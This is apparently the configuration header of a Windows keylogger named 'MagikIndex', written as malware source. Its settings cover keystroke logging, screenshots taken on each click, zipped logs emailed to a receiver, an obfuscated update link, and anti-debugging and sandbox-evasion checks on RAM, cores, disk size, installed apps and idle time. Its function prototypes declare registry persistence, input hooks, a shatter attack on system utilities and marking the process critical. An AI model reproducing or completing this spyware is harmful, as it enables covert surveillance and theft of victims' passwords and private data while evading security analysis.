#define WIN32_LEAN_AND_MEAN
#ifdef UNICODE
	#undef UNICODE
#endif
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <vector>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>
#include <VersionHelpers.h>
#include <slpublic.h>
#include <tlhelp32.h>
#include <algorithm>
#include <iterator>
#include <memory>
#include <set>
#include <comdef.h>
#include <comutil.h>
#include <Shldisp.h>
#include <shellapi.h>
#include <time.h>
#include <taskschd.h>
#include <assert.h>
#include <intrin.h>
#include <array>
#include <winioctl.h>
#include <shlwapi.h>
#include <lm.h>
#include <psapi.h>
#include <thread>
#include <Wbemidl.h>



#include "Antidbg.h"
#include "log.h"
//#include "lz4\lz4.h"
#include "base64.h"

using buffer = std::vector<char>;

//------------------------------------------------------
//                 Customization
//------------------------------------------------------


//[ VERSION INFO ]
#define IsMajor false		//let the program know whether its a Dev build or not
#define CurrentVersion "2.21"//current version number
#define GitVersionLink "i\\wnoNw;Yc|LZ\\YvYcpHYVx6Ycj34N6XI\\wn2crfY[P;{cu;ofvSZ[{L4Nv;4[wSpdnTpdxPoenPZfkXJc2n4\\weZ[{;{N8OJe2TJc"//link to GitHub Raw server containing up-to-date version file

//[ LOGS ]
#define CryptLogs false     //whether or not to crypt files
#define KeyShiftLimit 122   //cap for the highest possible random encryption key
#define LogMode 2           //how to log keystrokes                          [ 1 = Timer  ,  2 = Characters-per-log ]
#define LogTimer 15         //minutes per log                                [ must use mode 2 ]
#define CharactersPerLog 400//how many characters should be in a log         [ must use mode 1 ]
#define QuitIfUntrust false  //should we send a log if the environment is untrusted or quit on the spot?

//[ SCREENGRABBING ]
#define ScreenGrab true     //whether to screenshot at set intervals or not
#define ScreenshotMode 2    //how to screengrab                              [ 1 = Timer  ,  2 = Screenshot-On-Click ]
#define ScreenshotDelay 10	//only works when using the timer
#define ScreenshotsPerZip 5 //how many screenshots to collect before sending a zip file
#define ScreenshotCrop true	//whether to resize the resulting screenshot (be aware that this will stretch the image if the aspect ratio is different)
#define DestWidth	1920	//compressed screen width
#define DestHeight	1080	//compressed screen height

//[ EMAIL ]
#define SendersEmail ""
#define SendersPsw ""								 //IMPORTANT : due to google's cuckhold fetish the "Allow less secure apps" setting has now been removed, you are now required to enable 2-step auth and create an "App Password" for Mail. use the password provided by google in this field.
#define RecieversEmail ""

//[ ANTI-* ]
#define Hyperion false		//disables Anti-debugger exception traps in order to enable hyperion packing
#define ShatterAttack false //whether to shatter attack sys utils(cmd,Run,Taskmgmr)  KEEP DISABLED IN REALWORLD USAGE!
#define MaxInactivity 10    //max amount of seconds since last input         (anti-dbg feature)
#define MinRequiredApps 20  //minimum amount of installed programs           (anti-dbg feature)
#define SecurityLevel 3     //0-3 levels of trust towards environment        (anti-dbg feature)
#define MinHardDisk 60      //minimum size for the main partition(GB)        (anti-dbg feature)
#define DelayExecution false//whether or not execution should be delayed     (anti-dbg feature)
#define DelayTime 300       //amount of time for the delay (seconds)         (anti-dbg feature)
#define RequiredRam 2048    //MB                                             (anti-dbg feature)
#define RequiredCores 3     //pretty self explanatory                        (anti-dbg feature)

//[ MISC ]
#define MaximumFolderSize 10//limit of MagikIndex copies in a system


//------------------------------------------------------

#define MAX_LENGTH 1024


#define WINDOWS_SLID                                                \
            { 0x55c92734,                                           \
              0xd682,                                               \
              0x4d71,                                               \
            { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f   }    \
}


#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Slwga.lib")
#pragma comment( lib, "comsuppw.lib" )
#pragma comment(lib, "Wbemuuid.lib.")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "shlwapi.lib")

#define _WIN32_WINNT 0x050

extern "C" int RandomGenerator();
extern "C" void __AsmImpossibleDisassm();
extern "C" void __AsmJmpSameTarget();
void DeleteDirectory(std::string dir);
int CalculateDirSize(std::string DirectoryToCheck);
void CreateRegistryKey(PCSTR AppName, PCSTR PathToExe);
ULONG WINAPI Protect(LPVOID);
std::string GetCpuInfo();
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
ULONG WINAPI ScreenGrabber(LPVOID Parameter);
void TakeScreenShot(const char* filename);
BOOL fexists(std::string filename);                          
void FinalExit();
//void Compress(const buffer& in, buffer& out);
LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
std::string HardDecode(std::string EncodedString);
int Hooker(int HookType, HOOKPROC CallbackFunc);
void TimerThread();
std::string RetrieveExternalIp(std::string CurrentDir);
BOOL IsElevated();
std::string QueryWMI(bstr_t Table, const wchar_t* Item, int Type);
void FirstSetup();

typedef std::string String;
typedef std::vector<String> StringVector;
typedef unsigned long long uint64_t;

typedef long (WINAPI* RtlSetProcessIsCritical) (
	IN BOOLEAN	bNew,
	OUT BOOLEAN* pbOld,
	IN BOOLEAN	bNeedScb);
